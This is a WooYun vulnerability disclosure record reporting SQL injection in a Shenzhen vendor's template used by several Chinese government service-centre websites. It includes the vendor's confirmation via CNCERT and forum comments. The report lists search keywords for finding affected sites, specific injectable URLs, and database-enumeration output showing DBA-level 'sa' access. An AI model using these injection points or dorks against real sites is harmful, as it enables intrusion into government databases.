{"id": 5381, "wybug_id": "wooyun-2013-046677", "wybug_title": "深圳某软件公司程序SQL注入漏洞DBA权限可跨库（涉及多个政府部门）", "wybug_corp": "政府部门", "wybug_author": "HackBraid", "wybug_date": "2013-12-21 21:08", "wybug_open_date": "2014-03-21 21:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "管理后台对外", "后台被猜解", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-21：\t细节向公众公开  简要描述： 模板存在SQL注入，花了好长时间收集+编辑。@疯狗 这个算不算通用，感谢！ 详细说明：  1.技术支持：深圳太极软件有限公司2.谷歌关键词：技术支持：深圳太极软件有限公司?spitemid= 行政服务jsp?departid= 行政服务common.jsp?type=  行政服务3.通过关键词收集的存在漏洞站点，注射点很多，每个站点只列举一个以作证明：http://zwzx.wuchang.gov.cn/new/web/blzn/bszn_spiteminfo.jsp?spitemid=42010600GS-XK-0021-002 武汉市武昌区政务服务中心http://www.zcasc.gov.cn/application/wsbs/bszn/qysrgbdb_spiteminfo.jsp?spitemid=20130703102813875056 山东省淄博市淄川区行政服务中心http://zwzx.gzwuchuan.gov.cn/application/ztxz/xzjj.jsp?type=81&departid=4 贵州省遵义市务川自治县党务政务服务中心http://www.cyxzfw.gov.cn/application/zwgk/xzzhinanxiang.jsp?dhbt=%CD%F8%C9%CF%B0%EC%CA%C2&ZJJGDM=726108715&depName=%B3%A4%D1%F4%CF%D8%B9%AB%B0%B2%BE%D6%CF%FB%B7%C0%B4%F3%B6%D3长阳土家族自治县政务服务中心http://www.kyasc.cn/application/wsbs/bszn/xzzhinanxiang.jsp?ZJJGDM=16971551&depName=%B8%DF%D5%AF%B4%FA%C0%ED贵州省开阳政务网... ...应该还有不少吧。   漏洞证明：  #################################武汉市武昌区政务服务中心##############################注射点：http://zwzx.wuchang.gov.cn/new/web/blzn/bszn_spiteminfo.jsp?spitemid=42010600GS-XK-0021-002账户：\ncurrent user:    'sa'\n是不是DBA：\ncurrent user is DBA:    'True'\n数据库列表：\navailable databases [10]:[*] master[*] model[*] msdb[*] sp_hb_wh_wuchang2[*] tempdb[*] web_hb_wh_caidian_xndt[*] web_hb_wh_caidian_zw[*] web_hb_wh_wuchang[*] web_hb_wh_wuchang_xndt[*] zjk_wc\n##############################山东省淄博市淄川区行政服务中心############################账户：\ncurrent user:    'sa'\n是不是DBA：\ncurrent user is DBA:    'True'\n数据库列表：\navailable databases [6]:[*] master[*] model[*] msdb[*] tempdb[*] web_zc[*] web_zichuan\n##########################贵州省遵义市务川自治县党务政务服务中心#######################账户：\ncurrent user:    'WEB_ZUNYI_ZWZX'\n是不是DBA：\ncurrent user is DBA:    'True'\n数据库列表：\navailable databases [27]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] DZJC_PRESTAT[*] EXFSYS[*] GUIZHOU_DZJC[*] GZTYSP[*] HR[*] IX[*] MDSYS[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] TYSP[*] WEB_ZUNYI_ZW[*] WEB_ZUNYI_ZWZX[*] WEBSITE[*] WMSYS[*] XDB\n#############################长阳土家族自治县政务服务中心###############################账户：\ncurrent user:    'sa'\n是不是DBA：\ncurrent user is DBA:    'True'\n数据库列表：\navailable databases [5]:[*] master[*] model[*] msdb[*] tempdb[*] web_changyang\n###################################贵州省开阳政务网##################################账户：\ncurrent user:    'sa'\n是不是DBA：\ncurrent user is DBA:    'True'\n数据库列表：\navailable databases [5]:[*] master[*] model[*] msdb[*] tempdb[*] web_ky\n   修复方案：  字符过滤   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-12-26 08:20 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给广东分中心，由其后续协调软件生产厂商处置。此外，根据多个实例测试结果，已经转由CNCERT下发给山东、贵州、湖北等分中心，协调处置用户案例风险（主要涉及市县级行政审批中心） 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-21 21:16 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  谢谢，不算！    \n     2013-12-21 21:32 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @寂寞的瘦子 - -！应该算吧，模板的注入不都是通用的吗    \n     2013-12-21 21:43 |    \t\tdebbbbie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 深藏功与名 - A Rubyist)\t\t \n  终于加入了大家庭，感谢WooYunTV ~~    \n     2013-12-21 21:57 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @HackBraid 和你开个玩笑啦    \n     2013-12-21 22:05 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @寂寞的瘦子 - -！好吧    \n     2013-12-21 22:09 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @debbbbie Welcome!    \n     2013-12-21 22:17 |    \t\tdebbbbie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 深藏功与名 - A Rubyist)\t\t \n  @xsser 嗯嗯，向各位大牛学校！    \n     2013-12-21 22:17 |    \t\tdebbbbie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 深藏功与名 - A Rubyist)\t\t \n  @debbbbie 学习，打错鸟。。。    \n     2013-12-21 23:53 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @xsser 报告队长,俺发现一个bug！@debbbbie明明只有一个漏洞为啥显示是两个？有没有奖励！    \n     2013-12-22 00:05 |    \t\tdebbbbie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 深藏功与名 - A Rubyist)\t\t \n  @寂寞的瘦子 呃，半年前我曾经提交过一个不算漏洞的“漏洞”，被英明的毙掉了；时隔半年，终于修成正果。。。不知道是不是这个原因呀    \n     2013-12-22 00:06 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @debbbbie不要说出来啊，我的奖励没了啊    \n     2013-12-22 00:11 |    \t\tdebbbbie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 深藏功与名 - A Rubyist)\t\t \n  @寂寞的瘦子 = =！    \n     2013-12-22 10:55 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  收购WB价格1：6无限量收购    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}